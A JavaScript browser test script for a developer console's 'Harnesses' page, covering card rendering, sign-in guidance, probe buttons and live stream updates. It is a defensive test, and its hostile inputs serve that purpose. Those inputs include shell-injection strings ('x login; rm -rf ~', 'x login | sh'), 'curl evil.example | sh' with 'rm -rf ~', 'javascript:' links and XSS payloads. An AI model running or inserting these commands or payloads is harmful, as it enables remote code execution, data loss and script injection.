"use strict";

(async () => {
  const byID = id => document.getElementById(id);
  function check(test, message) { if (!test) throw new Error(message); }
  async function until(test, message) {
    const end = Date.now() + 8000;
    while (!(await test())) {
      check(Date.now() < end,message);
      await new Promise(resolve => setTimeout(resolve,20));
    }
  }
  const pause = ms => new Promise(resolve => setTimeout(resolve,ms));
  const post = (path, body) => fetch("/fixture/stream/" + path,{method:"POST",body});
  const sent = async route => (await (await fetch("/fixture/harnesses/requests")).json()).filter(item => !route || item.route === route);
  const answer = (route, code) => fetch("/fixture/harnesses/status?route=" + route + "&code=" + code,{method:"POST"});
  const repo = "3f2a9c1b7d4e5f60";
  const at = ms => new Date(Date.now() + ms).toISOString();
  const frame = (event, seq, data) => "event: " + event + "\n" + (seq ? "id: v1:" + repo + "=" + seq + "\n" : "") + "data: " + JSON.stringify(data) + "\n\n";
  const entry = state => ({projection:"harnesses",repo,state});
  const overview = {projection:"overview",repo,worktree:"first",state:{branch:"main",head:"1111111",oid:"1111111aaaaaaa1111111aaaaaaa1111111aaaa",detached:false,changed:0,staged:0,unstaged:0,untracked:0,operation:"",config:{valid:true,problems:[]}}};
  const snapshot = (seq, states) => frame("snapshot",seq,{cursor:"v1:" + repo + "=" + seq,states:[overview,...states]});
  const delta = (seq, type, states) => frame("delta",seq,{event:{id:"e" + seq,type,repo:"global",seq},states});

  // HarnessesState and harness.Harness from the ADR ("Phase 6 harnesses
  // projection", "Phase 6 Harness type"), as lane 6.2's projection will
  // send them.
  const okProbe = {status:"ok",code:"ok",probed_at:at(-600000),duration_ms:812};
  const acp = (extra = {}) => ({protocol_version:1,agent_name:"agent",load_session:true,image:true,audio:false,embedded_context:true,mcp_http:true,mcp_sse:false,logout:false,...extra});
  const harness = (id, extra = {}) => ({id,name:id,kind:"native",state:"native",code:"ok",sources:["registry"],command:id,path:"~/.local/bin/" + id,version:"1.0.0",registry_version:"1.0.0",
    probe:okProbe,acp:acp(),auth:{status:"unknown",code:"no_check"},...extra});
  const longPath = "~/Library/Application Support/fnm/node-versions/v24.11.1/installation/lib/node_modules/@agentclientprotocol/claude-agent-acp/dist/bin/claude-agent-acp";
  const gemini = harness("gemini",{name:"Gemini CLI",description:"Google's agent for the terminal.",sources:["registry","agentflow"],args:["--acp"],version:"0.71.1",registry_version:"0.71.1",
    acp:acp({agent_name:"gemini-cli",agent_version:"0.71.1"}),sign_in:[{method:"oauth-personal",type:"agent",name:"Log in with Google"},{method:"key",type:"agent",name:"Use an API key",description:"Requires GEMINI_API_KEY."}]});
  const claude = harness("claude-acp",{name:"Claude Agent",kind:"adapter",state:"adapter_installed",command:"claude-agent-acp",path:longPath,base:{name:"Claude Code",command:"claude",path:"~/.local/bin/claude"},
    version:"0.31.0",registry_version:"0.33.1",sign_in:[{method:"login",type:"terminal",name:"Log in with Claude",command:"claude-agent-acp --cli auth login"}],auth:{status:"signed_in",code:"ok",checked_at:at(-540000)}});
  const codex = harness("codex-acp",{name:"Codex CLI",kind:"adapter",state:"needs_auth",code:"signed_out",command:"codex-acp",base:{name:"Codex",command:"codex",path:"/opt/homebrew/bin/codex"},
    sign_in:[{method:"chatgpt",type:"terminal",name:"Sign in with ChatGPT",command:"codex-acp login"},{method:"device",type:"terminal",name:"Device code",command:"PATH=/tmp codex-acp login",unsafe:true},{method:"key",type:"agent",name:"Use an API key"}],
    auth:{status:"signed_out",code:"signed_out",checked_at:at(-480000)},fix:{text:"Sign in to Codex CLI, then probe again.",command:"codex login"}});
  const cursor = (extra = {}) => harness("cursor",{name:"Cursor",command:"cursor-agent",args:["acp"],code:"not_probed",probe:{status:"none",code:"not_probed"},acp:undefined,auth:{status:"unknown",code:"needs_person"},
    fix:{text:"Not checked yet. Probe it to confirm it speaks ACP.",command:"agentflow ai harnesses --probe"},...extra});
  const opencode = harness("opencode",{name:"OpenCode",code:"timeout",version:"",version_code:"no_version",probe:{status:"failed",code:"timeout",probed_at:at(-420000),duration_ms:5000},acp:undefined,
    fix:{text:"`opencode` did not answer within 5s. Probe again, or allow more time.",command:"agentflow config set ai.harnesses.probe_timeout=15s"},notes:["registry_env_ignored"]});
  const goose = harness("goose",{state:"incompatible",code:"protocol_version",probe:{status:"failed",code:"protocol_version",probed_at:at(-400000)},acp:undefined,
    fix:{text:"goose speaks ACP version 2; agentflow needs version 1. Update goose.",url:"https://github.com/block/goose"},quarantined:true,quarantine_reason:"<b>fails</b> its own checks",notes:["quarantined"]});
  const pi = harness("pi-acp",{name:"pi ACP",kind:"adapter",state:"adapter_available",code:"base_only",path:"",version:"",base:{name:"pi",command:"pi",path:"~/bin/pi"},probe:{status:"none",code:"not_probed"},acp:undefined,
    auth:{status:"unknown",code:"base_missing"},fix:{text:"pi is installed, but its ACP adapter is not. Install the adapter yourself; agentflow never installs it.",command:"npm install -g pi-acp@0.0.26",url:"https://github.com/svkozak/pi-acp"}});
  const mine = harness("my-agent",{name:"My agent",sources:["plugin:team-agents","personal"],probe:{status:"cached",code:"ok",probed_at:at(-72000000),duration_ms:96},
    auth:{status:"unknown",code:"env_credential"},fix:{text:"You may be signed in with an environment variable; agentflow cannot check that."},quarantined:true});
  const registry = {commit:"4273056f03b93f8ce41e9276256ea47b057b794c",committed_at:"2026-11-26T23:54:34Z",agents:46};
  const state = (harnesses, extra = {}) => ({detector:true,registry,auto_probe:true,harnesses,checked_at:at(-5000),...extra});
  const base = () => [gemini,claude,mine,codex,cursor(),opencode,goose,pi];

  const cards = list => [...byID("harnesses-" + list + "-list").children];
  const keys = list => cards(list).map(node => node.dataset.key).join();
  const card = key => document.querySelector('#page-harnesses .hn-card[data-key="' + key + '"]');
  const fact = (key, name) => card(key)?.querySelector('[data-fact="' + name + '"]');
  const shows = (key, name) => { const node = fact(key,name); return node && !node.hidden ? node.textContent : ""; };
  const part = (key, name) => card(key).querySelector('[data-part="' + name + '"]');
  const commands = node => [...node.querySelectorAll(".hn-command code")].map(code => code.textContent);
  const said = () => byID("live-announcer").textContent;
  const label = () => byID("stream-label").textContent;
  const visible = node => getComputedStyle(node).display !== "none";
  const current = () => [...document.querySelectorAll(".rail nav a[aria-current=page]")].map(node => node.dataset.page).join();
  // The browser asks for /favicon.ico by itself; the page asks for no image.
  const pictures = () => performance.getEntriesByType("resource").filter(item => !item.name.endsWith("/favicon.ico") && (item.initiatorType === "img" || /\.(svg|png|ico|gif|jpe?g|webp)(\?|$)/.test(item.name))).map(item => item.name);

  let result = "passed";
  try {
    // The reader is defensive: a missing or damaged state never throws.
    const H = AgentflowHarnesses;
    check(H.harnessesState(null) === null && H.harnessesState("x") === null && H.harnessesState([]) === null,"a missing state is not read as none");
    const bare = H.harnessesState({});
    check(bare.detector === false && bare.autoProbe === false && bare.harnesses.length === 0 && bare.registry.commit === "" && bare.checked === 0 && bare.probing.length === 0,"an empty state is not read safely");
    const odd = H.harnessesState({detector:"yes",auto_probe:1,registry:{commit:"<b>",committed_at:"never",agents:-4},checked_at:"never",probing:["a","ghost",7],skipped_path:[{dir:"~/x",reason:"inside_repository"},{reason:"no dir"},null],
      problems:[{layer:"personal",id:"x",code:"<i>",message:"bad"},{},null],
      harnesses:[{id:"a",state:"future",kind:"wasm",code:"<b>",sources:"all",args:"all",probe:"ok",auth:null,acp:"yes",fix:{text:"",command:"rm -rf ~\nls",url:"javascript:alert(1)"},sign_in:[{type:"terminal",name:"t",command:"a\u0007b"},null,{type:"robot"}],notes:"x"},
        {id:"a"},{name:"no id"},{id:"gone",state:"not_installed"},7]});
    const one = odd.harnesses[0];
    check(odd.harnesses.length === 1 && odd.detector === false && odd.autoProbe === false && odd.registry.commit === "" && odd.registry.agents === 0 && odd.probing.join() === "a" && odd.skipped.length === 1 && odd.problems.length === 1 && odd.problems[0].code === "","a damaged state is not read safely: " + JSON.stringify(odd));
    check(one.state === "unknown" && one.kind === "unknown" && one.code === "" && one.sources.length === 0 && one.args.length === 0 && one.probe.status === "none" && one.auth.status === "unknown" && one.acp === null && one.fix === null
      && one.signIn.length === 2 && one.signIn[0].command === "" && one.signIn[0].unsafe === true && one.signIn[1].type === "agent" && one.notes.length === 0 && one.name === "a","a damaged harness is not read safely: " + JSON.stringify(one));
    check(H.ready(H.harnessesState(state([gemini])).harnesses[0]) && H.ready(H.harnessesState(state([mine])).harnesses[0]) && !H.ready(H.harnessesState(state([cursor()])).harnesses[0]) && !H.ready(H.harnessesState(state([codex])).harnesses[0]),"ready is not: found, and answered a probe");
    check(H.authView({status:"signed_out",code:"signed_out"}).label === "Signed out" && H.authView({status:"unknown",code:"env_credential"}).label === "Sign-in not known" && H.authView({status:"unknown",code:"weird_code"}).detail === "Reason code weird_code."
      && H.authView({status:"signed_in",code:"ok"}).label === "Signed in","the sign-in verdicts are not told apart");
    check(H.skipReason("inside_repository") === "inside a repository Agentflow is working in" && H.skipReason("new_reason") === "new reason" && H.remaining(65000) === "1 min 05 s","reason codes or the countdown text are wrong");

    // A sign-in command is offered only when it is a plain command line.
    const offered = line => H.harnessesState(state([harness("x",{sign_in:[{method:"m",type:"terminal",name:"n",command:line}]})])).harnesses[0].signIn[0];
    for (const line of ["x login; rm -rf ~","x login | sh","x login && y","x $(id)","x `id`","x login > f","x login < f","x (y)","x 'login'","x \"login\"","PATH=/tmp x login","LD_PRELOAD=a.so x login","DYLD_INSERT_LIBRARIES=a x login",
      "NODE_OPTIONS=--require=a x login","http_proxy=h x login","GIT_SSH=a x login","lower=1 x login","OK=1 BASH_ENV=a x login","OK=1"," x login"]) {
      check(offered(line).command === "" && offered(line).unsafe === true,"an unsafe sign-in command is offered: " + line);
    }
    for (const line of ["x login","x --cli auth login","X_PROFILE=work x acp login --token-stdin","A=1 B_2=two x login"]) check(offered(line).command === line && !offered(line).unsafe,"a plain sign-in command is refused: " + line);
    // The fix command is Agentflow's own template and is not put through that check.
    check(H.harnessesState(state([harness("x",{fix:{text:"t",command:"agentflow config set a.b='c d'"}})])).harnesses[0].fix.command === "agentflow config set a.b='c d'","a fix command is refused by the sign-in check");

    await until(() => !byID("connection-options").hidden,"the console did not ask for a session");
    const ticket = await (await fetch("/fixture/ticket",{method:"POST"})).text();
    location.hash = new URLSearchParams({launch:ticket,screen:"overview"}).toString();
    await until(() => !byID("console-shell").hidden && !byID("page-overview").hidden,"the overview did not open");
    check(byID("page-harnesses").hidden && current() === "overview","the Harnesses page shows before it is opened");

    // Coming back to the window on another page asks for nothing.
    window.dispatchEvent(new Event("focus"));
    document.dispatchEvent(new Event("visibilitychange"));
    await pause(150);
    check((await sent()).length === 0,"a page other than Harnesses sent a harness request");

    // The rail entry opens the page; the other pages step aside.
    const navigation = document.querySelector('.rail nav a[data-page="harnesses"]');
    check(navigation && !navigation.hidden && visible(navigation) && navigation.getAttribute("href") === "#harnesses" && navigation.textContent.trim() === "Harnesses","the rail has no Harnesses entry");
    navigation.click();
    await until(() => !byID("page-harnesses").hidden && current() === "harnesses","the Harnesses page did not open");
    check(!visible(byID("page-overview")) && !visible(byID("page-plugins")) && visible(byID("page-harnesses")) && document.activeElement === byID("main"),"another page shows beside Harnesses, or focus did not move to the page");
    check(!byID("harnesses-wait").hidden && byID("harnesses-body").hidden && byID("harnesses-note").hidden,"the page does not show that it waits for the stream");

    // A live stream without a harnesses state says so.
    await post("emit",snapshot(1,[]));
    await until(() => label() === "Live" && !byID("harnesses-note").hidden,"the page does not say that the stream has no harness state");
    check(byID("harnesses-note").textContent.includes("no harness state") && byID("harnesses-wait").hidden && byID("harnesses-body").hidden,"the missing state is not explained");

    // The first state fills the page without highlights or announcements.
    const skipped = [{dir:"~/GitHub/agentflow/bin",reason:"inside_repository"},{dir:"/usr/local/shared",reason:"unsafe_permissions"}];
    const problems = [{layer:"personal",id:"codex-acp",code:"launcher",message:"command \"npx\" is a package runner"}];
    await post("emit",snapshot(2,[entry(state(base(),{skipped_path:skipped,problems}))]));
    await until(() => !byID("harnesses-body").hidden,"the snapshot did not fill the page");
    check(byID("harnesses-wait").hidden && byID("harnesses-note").hidden && byID("harnesses-detector").hidden && !document.querySelector("#page-harnesses .live-changed") && !said(),"the first state was highlighted, announced or marked stale");
    check(keys("ready") === "gemini,claude-acp,my-agent" && keys("attention") === "codex-acp,cursor,opencode,goose,pi-acp","the groups are wrong: " + keys("ready") + " | " + keys("attention"));
    check(byID("harnesses-summary").textContent.startsWith("8 harnesses found · 3 ready · 5 need attention. Checked at ") && byID("harnesses-ready-count").textContent === "3" && byID("harnesses-attention-count").textContent === "5","the summary is wrong: " + byID("harnesses-summary").textContent);
    check(byID("harnesses-empty").hidden && visible(byID("harnesses-ready")) && visible(byID("harnesses-attention")) && byID("harnesses-ready-none").hidden && byID("harnesses-attention-none").hidden,"the groups or the empty state show wrongly");

    // The header: the registry copy, automatic probes, the Settings link, skipped PATH entries and problems.
    check(byID("harnesses-registry").textContent.startsWith("commit 4273056f03b9 · from ") && byID("harnesses-registry").textContent.endsWith(" · 46 agents"),"the registry copy is wrong: " + byID("harnesses-registry").textContent);
    check(byID("harnesses-auto").textContent === "On" && byID("harnesses-auto").dataset.state === "on" && byID("harnesses-auto-detail").textContent.includes("starts a new or changed harness once"),"automatic probes are not shown as on");
    const links = [...document.querySelectorAll("#page-harnesses a[data-settings]")];
    check(links.length === 2 && links.every(link => link.getAttribute("href") === "#settings?group=ai"),"the page does not link to the Settings group ai");
    check(!document.querySelector("#page-harnesses input, #page-harnesses select, #page-harnesses textarea, #page-harnesses form"),"the page has a control that edits a setting");
    check(!byID("harnesses-skipped").hidden && byID("harnesses-skipped-title").textContent === "2 PATH entries skipped" && byID("harnesses-skipped-list").children.length === 2
      && byID("harnesses-skipped-list").children[0].textContent === "~/GitHub/agentflow/bin inside a repository Agentflow is working in","the skipped PATH entries are wrong: " + byID("harnesses-skipped-list").textContent);
    check(!byID("harnesses-problems").hidden && byID("harnesses-problems-title").textContent === "1 harness definition has a problem" && byID("harnesses-problem-list").textContent === "codex-acp from your settings command \"npx\" is a package runner launcher","the problems are wrong: " + byID("harnesses-problem-list").textContent);

    // A ready native harness: its facts, no fix, sign-in not known with guidance kept closed.
    check(card("gemini").dataset.mark === "ready" && card("gemini").dataset.kind === "native" && shows("gemini","status") === "Ready" && fact("gemini","status").dataset.state === "good" && shows("gemini","name") === "Gemini CLI"
      && shows("gemini","kind") === "Native" && shows("gemini","version") === "Version 0.71.1" && shows("gemini","registry") === "" && shows("gemini","description") === "Google's agent for the terminal.","the ready card is wrong");
    check(card("gemini").getAttribute("aria-labelledby") === card("gemini").querySelector("h3").id && card("gemini").querySelector(".hn-icon").getAttribute("aria-hidden") === "true" && !card("gemini").querySelector("img, svg, picture"),"the card is not named by its heading, or it loads an icon");
    check(fact("gemini","runs").textContent === "gemini --acp" && fact("gemini","runs").querySelectorAll("code").length === 2 && shows("gemini","path") === "~/.local/bin/gemini" && fact("gemini","base").parentNode.hidden && part("gemini","fix").hidden,"the command, path or fix of the ready card is wrong");
    check(shows("gemini","auth") === "Sign-in not known" && fact("gemini","auth").dataset.state === "unknown" && shows("gemini","auth-detail") === "Agentflow has no verified way to check sign-in for this harness."
      && !part("gemini","methods").open && shows("gemini","methods-title") === "How to sign in (2 ways)" && part("gemini","methods").querySelectorAll("li").length === 2 && commands(part("gemini","methods")).length === 0
      && part("gemini","methods").textContent.includes("Start Gemini CLI in your terminal and sign in with its own login, then probe again."),"the sign-in guidance of an unchecked harness is wrong");
    check(fact("gemini","state").textContent === "Native ok" && fact("gemini","probe").textContent.startsWith("Answered in 812 ms · ") && fact("gemini","probe").querySelector("time").dateTime && shows("gemini","sources") === "the ACP registry, then Agentflow"
      && shows("gemini","acp") === "Protocol version 1 · agent gemini-cli 0.71.1" && shows("gemini","can") === "Resuming a session, images, embedded context, MCP servers over HTTP" && shows("gemini","cannot") === "Audio, MCP servers over SSE, signing out","the detection details are wrong: " + card("gemini").querySelector(".hn-about").textContent);

    // A ready adapter: the base CLI, a long path that wraps, signed in.
    check(card("claude-acp").dataset.kind === "adapter" && shows("claude-acp","kind") === "Adapter" && shows("claude-acp","registry") === "Registry lists 0.33.1" && shows("claude-acp","path") === longPath && fact("claude-acp","base").textContent === "Claude Code at ~/.local/bin/claude","the adapter card is wrong");
    check(shows("claude-acp","auth") === "Signed in" && fact("claude-acp","auth").dataset.state === "in" && shows("claude-acp","auth-detail") === "" && shows("claude-acp","auth-at").startsWith("Checked ") && !part("claude-acp","methods").open
      && commands(part("claude-acp","methods")).join() === "claude-agent-acp --cli auth login","a signed-in harness is wrong");
    check(card("claude-acp").scrollWidth <= card("claude-acp").clientWidth && document.documentElement.scrollWidth <= document.documentElement.clientWidth,"a long path makes the card or the page scroll sideways");

    // A cached answer still counts as ready; the environment note is said once; layers and notes are named.
    check(shows("my-agent","status") === "Ready" && fact("my-agent","probe").textContent.includes("(saved result)") && shows("my-agent","sources") === "plugin team-agents, then your settings","the cached harness is wrong");
    check(!part("my-agent","fix").hidden && part("my-agent","fix").textContent === "You may be signed in with an environment variable; agentflow cannot check that." && shows("my-agent","auth") === "Sign-in not known" && shows("my-agent","auth-detail") === ""
      && part("my-agent","notes").textContent === "The ACP registry has quarantined this agent.","the environment variable note or the quarantine note is wrong");

    // Signed out is not the same as not known: another label, another mark, the fix first and the methods open.
    check(card("codex-acp").dataset.mark === "attention" && shows("codex-acp","status") === "Sign-in needed" && fact("codex-acp","status").dataset.state === "warn" && shows("codex-acp","auth") === "Signed out" && fact("codex-acp","auth").dataset.state === "out"
      && shows("codex-acp","auth-detail") === "Its own status command says you are not signed in." && fact("codex-acp","auth").dataset.state !== fact("gemini","auth").dataset.state,"signed out reads like not known");
    check(part("codex-acp","fix").dataset.tone === "warn" && part("codex-acp","fix").querySelector(".hn-fix-text").textContent === "Sign in to Codex CLI, then probe again." && commands(part("codex-acp","fix")).join() === "codex login"
      && part("codex-acp","fix").compareDocumentPosition(part("codex-acp","sign-in")) & Node.DOCUMENT_POSITION_FOLLOWING,"the sign-in fix is wrong or not first");
    const methods = [...part("codex-acp","methods").querySelectorAll(".hn-method-list > li")];
    check(part("codex-acp","methods").open && methods.length === 3 && commands(methods[0]).join() === "codex-acp login" && commands(methods[1]).length === 0 && methods[1].textContent.includes("Agentflow does not show this method's command")
      && !part("codex-acp","methods").textContent.includes("PATH=/tmp") && methods[2].textContent.includes("sign in with its own login"),"the sign-in methods are wrong: " + part("codex-acp","methods").textContent);

    // Not probed, a failed probe, incompatible and adapter missing each read differently.
    // A harness that was never started: its fix box holds its own Probe now button, not a terminal command,
    // and the sign-in line does not repeat the fix.
    check(card("cursor").dataset.mark === "idle" && shows("cursor","status") === "Not checked yet" && fact("cursor","probe").textContent === "Not run yet" && commands(part("cursor","fix")).length === 0
      && part("cursor","fix").contains(part("cursor","probe")) && part("cursor","fix").querySelector(".hn-fix-text").textContent === "Not checked yet. Probe it to confirm it speaks ACP."
      && shows("cursor","auth") === "Sign-in not known" && shows("cursor","auth-detail") === "" && !part("gemini","fix").contains(part("gemini","probe")) && !part("opencode","fix").contains(part("opencode","probe")),"the unprobed card is wrong");
    const box = card("pi-acp").querySelector(".hn-command pre");
    check(box.getAttribute("role") === "group" && box.getAttribute("aria-label") === "Fix command" && box.tabIndex === 0,"a command box that takes focus has no role or name");

    // The summary leads to the group that needs attention.
    const jump = byID("harnesses-summary").querySelector("button");
    check(jump && jump.textContent === "5 need attention","the summary has no way to the Needs attention group");
    jump.click();
    check(document.activeElement === byID("harnesses-attention-title"),"the summary's button did not move focus to Needs attention");
    check(shows("opencode","status") === "Probe failed" && shows("opencode","version") === "Version not reported" && fact("opencode","probe").textContent.startsWith("No answer in time · ") && part("opencode","fix").querySelector("code").textContent === "opencode"
      && part("opencode","fix").querySelector(".hn-fix-text").textContent === "opencode did not answer within 5s. Probe again, or allow more time." && part("opencode","notes").textContent.includes("never applies them"),"the failed probe card is wrong");
    const repoLink = part("goose","fix").querySelector("a");
    check(card("goose").dataset.mark === "bad" && shows("goose","status") === "Incompatible" && fact("goose","status").dataset.state === "bad" && part("goose","fix").dataset.tone === "bad" && fact("goose","state").textContent === "Incompatible protocol_version"
      && part("goose","notes").children.length === 1 && part("goose","notes").textContent === "The ACP registry has quarantined this agent: <b>fails</b> its own checks" && !part("goose","notes").querySelector("b")
      && repoLink.href === "https://github.com/block/goose" && repoLink.textContent === "https://github.com/block/goose" && repoLink.target === "_blank" && repoLink.rel === "noopener noreferrer","the incompatible card is wrong");
    check(shows("pi-acp","status") === "Adapter not installed" && shows("pi-acp","path") === "Not on your PATH" && fact("pi-acp","runs").previousSibling.textContent === "Would run" && fact("pi-acp","base").textContent === "pi at ~/bin/pi" && part("pi-acp","sign-in").hidden
      && part("pi-acp","probe").parentNode.hidden && commands(part("pi-acp","fix")).join() === "npm install -g pi-acp@0.0.26" && shows("pi-acp","version") === "","the missing adapter card is wrong");

    // Copy puts the exact command on the clipboard and says so.
    let copied = "";
    Object.defineProperty(navigator,"clipboard",{configurable:true,value:{writeText:async value => { copied = value; }}});
    const copyButton = part("pi-acp","fix").querySelector(".hn-command button");
    check(copyButton.getAttribute("aria-label") === "Copy the command: npm install -g pi-acp@0.0.26","the Copy button does not name its command");
    copyButton.click();
    await until(() => copied === "npm install -g pi-acp@0.0.26" && said() === "Fix command copied." && copyButton.textContent === "Copied","Copy did not copy the fix command");
    part("codex-acp","methods").querySelector(".hn-command button").click();
    await until(() => copied === "codex-acp login" && said() === "Sign-in command copied.","Copy did not copy the sign-in command");
    Object.defineProperty(navigator,"clipboard",{configurable:true,value:{writeText:async () => { throw new Error("denied"); }}});
    copyButton.click();
    await until(() => said().startsWith("The browser did not allow copying."),"a refused copy is not explained");

    // Coming back to the window asks the daemon to look again, at most once every 10 s. Nothing else is sent.
    check((await sent()).length === 0,"the page sent a request before anyone asked");
    window.dispatchEvent(new Event("focus"));
    await until(async () => (await sent("check")).length === 1,"focus did not send a check");
    const checkRequest = (await sent("check"))[0];
    check(checkRequest.console === "console" && checkRequest.content_type === "application/json" && checkRequest.origin === location.origin && checkRequest.body === "{}","the check request is wrong: " + JSON.stringify(checkRequest));
    document.dispatchEvent(new Event("visibilitychange"));
    window.dispatchEvent(new Event("focus"));
    await pause(200);
    check((await sent()).length === 1,"a second check was sent within 10 s");

    // Probe now, refused by the console: the reason shows as text and the button works again.
    const probeAll = byID("harnesses-probe");
    check(visible(probeAll) && !probeAll.hasAttribute("aria-disabled") && probeAll.getAttribute("aria-describedby").includes("harnesses-probe-status"),"Probe now is not ready");
    await answer("probe","429");
    probeAll.click();
    await until(() => !byID("harnesses-probe-error").hidden,"a refused probe is not explained");
    const refused = (await sent("probe"));
    check(refused.length === 1 && refused[0].body === "{}" && refused[0].console === "console" && refused[0].content_type === "application/json","probing every harness does not send {}: " + JSON.stringify(refused));
    check(byID("harnesses-probe-error").textContent === "The probe did not start. This console probed less than a minute ago." && !probeAll.hasAttribute("aria-disabled") && byID("harnesses-probe-status").textContent === "","the refusal is not shown, or the button stays blocked");
    await answer("probe","0");

    // Probe one card: the request names it, and every probe button waits for the next minute.
    const probeCursor = part("cursor","probe");
    check(probeCursor.getAttribute("aria-label") === "Probe now: Cursor","the card's probe button does not name its harness");
    probeCursor.focus();
    probeCursor.click();
    await until(async () => (await sent("probe")).length === 2,"the card did not send a probe");
    check((await sent("probe"))[1].body === '{"ids":["cursor"]}',"the card's probe does not name its harness: " + (await sent("probe"))[1].body);
    await until(() => said() === "Probe requested for Cursor." && byID("harnesses-probe-error").hidden,"the probe request is not announced, or the old refusal stays");
    check(probeAll.getAttribute("aria-disabled") === "true" && probeCursor.getAttribute("aria-disabled") === "true" && !probeAll.disabled && byID("harnesses-probe-status").textContent === "Probe requested. The results arrive here.","the probe buttons do not wait");
    // A card's button says beside it why it waits.
    check(part("gemini","probe-status").textContent === "Probe requested. The results arrive here." && part("gemini","probe").getAttribute("aria-describedby") === part("gemini","probe-status").id && visible(part("gemini","probe-status")),"a waiting card button gives no reason");
    probeAll.click();
    part("gemini","probe").click();
    await pause(200);
    check((await sent("probe")).length === 2 && said().startsWith("Probe requested. The results"),"a waiting probe button sent a request, or did not say why it waits: " + said());

    // The stream shows the probe running, then its result. The card moves to Ready and keeps focus.
    await post("emit",delta(3,"harness.changed",[entry(state(base(),{skipped_path:skipped,problems,probing:["cursor"]}))]));
    await until(() => shows("cursor","probing") === "Probing","the card does not show that it is being probed");
    check(byID("harnesses-probe-status").textContent === "Probing Cursor…" && probeCursor.textContent === "Probing…" && shows("gemini","probing") === "" && document.activeElement === probeCursor,"the probing state is wrong");
    const probed = cursor({code:"ok",probe:{status:"ok",code:"ok",probed_at:at(0),duration_ms:1304},acp:acp(),fix:undefined,auth:{status:"unknown",code:"no_check"}});
    const moved = card("cursor");
    await post("emit",delta(4,"harness.changed",[entry(state([gemini,claude,mine,probed,codex,opencode,goose,pi],{skipped_path:skipped,problems,checked_at:at(0)}))]));
    await until(() => keys("ready") === "gemini,claude-acp,my-agent,cursor","the probed card did not move to Ready: " + keys("ready"));
    check(/^You can probe again in /.test(part("claude-acp","probe-status").textContent) && moved.querySelector(".hn-actions").parentNode === moved,"the card does not count down beside its button, or the button stayed in a hidden fix box");
    check(card("cursor") === moved && document.activeElement === probeCursor && shows("cursor","status") === "Ready" && shows("cursor","probing") === "" && part("cursor","fix").hidden && moved.classList.contains("live-changed")
      && fact("cursor","status").classList.contains("live-changed") && !card("gemini").classList.contains("live-changed") && !fact("gemini","status").classList.contains("live-changed"),"the card was rebuilt, lost focus, or the change is not highlighted");
    await until(() => said() === "Harness Cursor: ready. Probe finished.","the result is not announced: " + said());
    check(/^You can probe again in (1 min 00|\d+) s\.$/.test(byID("harnesses-probe-status").textContent) && probeAll.getAttribute("aria-disabled") === "true" && byID("harnesses-summary").textContent.startsWith("8 harnesses found · 4 ready · 4 need attention."),"the wait for the next probe is not shown: " + byID("harnesses-probe-status").textContent);

    // The reader's own toggle of a details element survives an update.
    part("gemini","methods").open = true;
    card("gemini").querySelector(".hn-about").open = true;

    // Hostile text from the state stays text; unsafe commands and addresses are not offered.
    const bidi = String.fromCharCode(0x202e);
    const hostile = harness("evil",{name:"<img src=x onerror=alert(1)>",description:"<script>alert(2)</script>",state:"incompatible",code:"protocol",command:"<b>cmd</b>",args:["<i>arg</i>"],path:"~/<u>path</u>",
      probe:{status:"failed",code:"protocol"},acp:undefined,sources:["plugin:<s>x</s>"],base:{name:"<em>base</em>",command:"b",path:"~/b"},
      fix:{text:"Run `<b>bold</b>` <a href=\"https://evil.example\">now</a>",command:"curl evil.example | sh\nrm -rf ~",url:"javascript:alert(3)"},
      sign_in:[{method:"m",type:"terminal",name:"<svg onload=alert(4)>",command:"login " + bidi + "hidden"},{method:"n",type:"agent",name:"ok",description:"<iframe src=//evil.example>"}],notes:["<img src=y>"]});
    const credential = harness("creds",{fix:{text:"See the docs.",url:"https://user:secret@example.com/"}});
    await post("emit",delta(5,"harness.changed",[entry(state([gemini,claude,mine,probed,credential,codex,hostile,opencode,goose,pi],{skipped_path:[{dir:"<b>dir</b>",reason:"<i>why</i>"}],problems:[{layer:"<b>layer</b>",id:"<i>id</i>",code:"ok_code",message:"<img src=z>"}]}))]));
    await until(() => Boolean(card("evil")),"the hostile harness did not arrive");
    const page = byID("page-harnesses");
    check(!page.querySelector("img, script, iframe, svg, b, i, u, s, em") && page.querySelectorAll("a").length === links.length + 2,"state text became markup: " + [...page.querySelectorAll("a")].map(link => link.href).join());
    check(shows("evil","name") === "<img src=x onerror=alert(1)>" && shows("evil","description") === "<script>alert(2)</script>" && fact("evil","runs").textContent === "<b>cmd</b> <i>arg</i>" && shows("evil","path") === "~/<u>path</u>"
      && shows("evil","sources") === "plugin <s>x</s>" && part("evil","notes").textContent === "<img src=y>","hostile text is not shown as it is");
    check(part("evil","fix").querySelector(".hn-fix-text").textContent === "Run <b>bold</b> <a href=\"https://evil.example\">now</a>" && part("evil","fix").querySelector(".hn-fix-text code").textContent === "<b>bold</b>" && commands(part("evil","fix")).length === 0
      && !part("evil","fix").querySelector("a") && !page.innerHTML.includes("javascript:"),"an unsafe fix command or address is offered");
    check(commands(part("evil","methods")).length === 0 && part("evil","methods").textContent.includes("Agentflow does not show this method's command") && part("evil","methods").textContent.includes("<iframe src=//evil.example>"),"a sign-in command with hidden characters is offered");
    check(!part("creds","fix").querySelector("a") && part("creds","fix").textContent === "See the docs.","an address with a credential became a link");
    check(byID("harnesses-skipped-list").textContent === "<b>dir</b> <i>why</i>" && byID("harnesses-problem-list").textContent === "<i>id</i> from <b>layer</b> <img src=z> ok_code","hostile header text is not shown as it is");
    check(pictures().length === 0,"the page loaded an image: " + pictures().join());
    check(part("gemini","methods").open && card("gemini").querySelector(".hn-about").open,"an update closed a details element the reader opened");

    // A harness that goes away takes its card; focus moves to the page title.
    part("opencode","probe").focus();
    await post("emit",delta(6,"harness.removed",[entry(state([gemini,claude,mine,probed,codex,goose,pi]))]));
    await until(() => !card("opencode") && !card("evil"),"the removed harness still shows");
    check(document.activeElement === byID("harnesses-title") && byID("harnesses-skipped").hidden && byID("harnesses-problems").hidden,"focus was dropped, or old header rows stay");
    await until(() => said() === "Harness creds is no longer found. Harness <img src=x onerror=alert(1)> is no longer found. Harness OpenCode is no longer found.","the removal is not announced: " + said());

    // A harness that appears is added in place, highlighted and announced; signing in changes the verdict live.
    const signedIn = {...codex,state:"adapter_installed",code:"ok",auth:{status:"signed_in",code:"ok",checked_at:at(0)},fix:undefined};
    const kept = card("gemini");
    await post("emit",delta(7,"harness.detected",[entry(state([gemini,claude,signedIn,mine,probed,opencode,goose,pi]))]));
    await until(() => keys("ready") === "gemini,claude-acp,codex-acp,my-agent,cursor" && Boolean(card("opencode")),"the new and the signed-in harness did not arrive: " + keys("ready"));
